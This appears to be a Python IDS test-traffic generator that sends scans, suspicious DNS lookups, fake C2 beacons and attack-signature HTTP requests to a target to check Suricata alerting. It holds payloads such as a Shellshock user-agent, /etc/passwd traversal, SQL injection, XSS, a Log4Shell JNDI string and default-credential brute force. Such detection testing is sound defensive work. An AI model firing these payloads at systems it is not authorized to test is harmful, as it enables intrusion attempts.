#!/usr/bin/env python3
"""
SCARLET IDS Test-Traffic Generator
==================================

Generates recognizable *security-event test traffic* toward a target IP to
validate that a SCARLET probe running Suricata detects and forwards alerts.

⚠️  AUTHORIZED TESTING ONLY. Use exclusively against systems you own or are
    explicitly permitted to test. This tool sends signature-triggering patterns
    (suspicious user-agents, URI patterns, scans, DNS lookups, EICAR string) —
    it does NOT exploit anything; it is meant to exercise IDS detection on your
    own monitored network. You are responsible for how you use it.

Install on any computer on the monitored LAN and run, e.g.:

    python3 event_generator.py 192.168.1.50 --scenario all --intensity 3

Requires only the Python standard library.
"""

import argparse
import random
import socket
import ssl
import time
import sys
import http.client

EICAR = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

# Suspicious User-Agents commonly flagged by Emerging Threats rules
BAD_UAS = [
    "() { :; }; /bin/bash -c 'id'",                       # Shellshock
    "sqlmap/1.7#stable (https://sqlmap.org)",             # SQLi tool
    "Nikto/2.5.0",                                        # web scanner
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)", # legacy/suspect
    "python-requests/2.0 (BlackSun-Bot)",                # bot-like
    "Wget/1.10 (i686-pc-linux-gnu)",
    "Mozilla/5.0 zgrab/0.x",                              # internet scanner
]

# URI patterns that match web-attack signatures
BAD_URIS = [
    "/../../../../etc/passwd",                            # path traversal
    "/index.php?id=1' OR '1'='1",                         # SQLi
    "/search?q=<script>alert(1)</script>",               # XSS
    "/admin/config.php",
    "/shell.php?cmd=whoami",                              # webshell
    "/wp-login.php",
    "/.env",                                              # secrets probe
    "/api/v1/?${jndi:ldap://example.com/a}",             # Log4Shell pattern
    "/cgi-bin/test.cgi",
    "/phpmyadmin/index.php",
    "/.git/config",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
]

# Suspicious / DGA-like domains for DNS lookups
BAD_DOMAINS = [
    "malware-c2-test.example", "kjhg8s7df6g.example", "update-secure-login.example",
    "free-bitcoin-generator.example", "xn--pple-43d.example", "data-exfil.example",
    "ad.doubleclick.net", "tracking.evil-cdn.example",
]


def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}")


def http_request(ip, port, path, headers=None, body=None, timeout=3):
    try:
        conn = http.client.HTTPConnection(ip, port, timeout=timeout)
        conn.request("GET" if body is None else "POST", path, body=body, headers=headers or {})
        resp = conn.getresponse()
        conn.close()
        return resp.status
    except Exception:
        return None


# --------------------------------------------------------------------------
# Scenarios
# --------------------------------------------------------------------------
def scenario_port_scan(ip, intensity):
    log("PORT SCAN — TCP connect sweep")
    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 3306,
             3389, 5432, 5900, 6379, 8080, 8443, 9200, 27017]
    random.shuffle(ports)
    for p in ports[: 8 + intensity * 4]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.4)
            s.connect_ex((ip, p))
            s.close()
        except Exception:
            pass
    log(f"  scanned {8 + intensity * 4} ports")


def scenario_web_attacks(ip, intensity, port=80):
    log("WEB ATTACKS — malicious URIs + bad user-agents")
    for _ in range(4 + intensity * 3):
        uri = random.choice(BAD_URIS)
        ua = random.choice(BAD_UAS)
        http_request(ip, port, uri, headers={"User-Agent": ua, "Host": ip})
    log(f"  sent {4 + intensity * 3} web-attack requests")


def scenario_eicar(ip, intensity, port=80):
    log("MALWARE — EICAR antivirus test string over HTTP")
    for _ in range(1 + intensity):
        http_request(ip, port, "/download/eicar.com",
                     headers={"User-Agent": "curl/8.0", "X-Test-Payload": EICAR})


def scenario_brute_force(ip, intensity, port=80):
    log("BRUTE FORCE — repeated auth attempts")
    import base64
    creds = ["admin:admin", "root:root", "admin:password", "user:123456", "admin:letmein"]
    for _ in range(6 + intensity * 4):
        c = base64.b64encode(random.choice(creds).encode()).decode()
        http_request(ip, port, "/admin/", headers={"Authorization": f"Basic {c}", "User-Agent": "Hydra"})
    log(f"  sent {6 + intensity * 4} login attempts")


def scenario_dns(ip, intensity):
    log("DNS — lookups to suspicious / DGA-like domains")
    for d in BAD_DOMAINS[: 4 + intensity]:
        try:
            socket.gethostbyname(d)
        except Exception:
            pass
    log(f"  queried {min(len(BAD_DOMAINS), 4 + intensity)} domains")


def scenario_c2_beacon(ip, intensity, port=80):
    log("C2 BEACON — periodic check-ins to /gate.php")
    for _ in range(3 + intensity * 2):
        http_request(ip, port, "/gate.php?id=BOT-" + str(random.randint(1000, 9999)),
                     headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Trident/7.0)"})
        time.sleep(0.3)


def scenario_tls_odd_port(ip, intensity):
    log("TLS — handshakes on unusual ports")
    for p in [4444, 8443, 9001, 1337][: 2 + intensity]:
        try:
            ctx = ssl._create_unverified_context()
            s = ctx.wrap_socket(socket.socket(), server_hostname=ip)
            s.settimeout(2)
            s.connect((ip, p))
            s.close()
        except Exception:
            pass


def scenario_icmp(ip, intensity):
    log("RECON — ICMP echo sweep")
    import subprocess
    import shutil
    if not shutil.which("ping"):
        log("  ping not available; skipping")
        return
    count = str(3 + intensity)
    try:
        subprocess.run(["ping", "-c", count, "-i", "0.3", ip],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=20)
    except Exception:
        pass


SCENARIOS = {
    "port_scan": scenario_port_scan,
    "web_attacks": scenario_web_attacks,
    "eicar": scenario_eicar,
    "brute_force": scenario_brute_force,
    "dns": scenario_dns,
    "c2_beacon": scenario_c2_beacon,
    "tls_odd_port": scenario_tls_odd_port,
    "icmp": scenario_icmp,
}


def main():
    ap = argparse.ArgumentParser(description="SCARLET IDS test-traffic generator (authorized testing only).")
    ap.add_argument("target", help="Target IP to send test traffic to")
    ap.add_argument("--scenario", default="all",
                    help="Scenario to run: all | " + " | ".join(SCENARIOS))
    ap.add_argument("--port", type=int, default=80, help="HTTP port (default 80)")
    ap.add_argument("--intensity", type=int, default=2, help="1=light .. 5=heavy")
    ap.add_argument("--loop", type=int, default=1, help="Repeat N times (0 = forever)")
    ap.add_argument("--interval", type=float, default=5.0, help="Seconds between loops")
    ap.add_argument("--yes", action="store_true", help="Skip the authorization confirmation")
    args = ap.parse_args()

    print(__doc__.split("Install")[0])
    if not args.yes:
        ans = input(f"Confirm you are AUTHORIZED to test {args.target}? [y/N] ").strip().lower()
        if ans != "y":
            print("Aborted.")
            sys.exit(1)

    chosen = list(SCENARIOS) if args.scenario == "all" else [args.scenario]
    for c in chosen:
        if c not in SCENARIOS:
            print(f"Unknown scenario: {c}")
            sys.exit(2)

    n = 0
    while True:
        n += 1
        log(f"=== Run #{n} against {args.target} (intensity {args.intensity}) ===")
        for c in chosen:
            fn = SCENARIOS[c]
            try:
                if c in ("web_attacks", "eicar", "brute_force", "c2_beacon"):
                    fn(args.target, args.intensity, args.port)
                else:
                    fn(args.target, args.intensity)
            except KeyboardInterrupt:
                raise
            except Exception as e:
                log(f"  {c} error: {e}")
        if args.loop and n >= args.loop:
            break
        try:
            time.sleep(args.interval)
        except KeyboardInterrupt:
            break
    log("Done. Check the SCARLET Threat Monitor for generated alerts.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nInterrupted.")
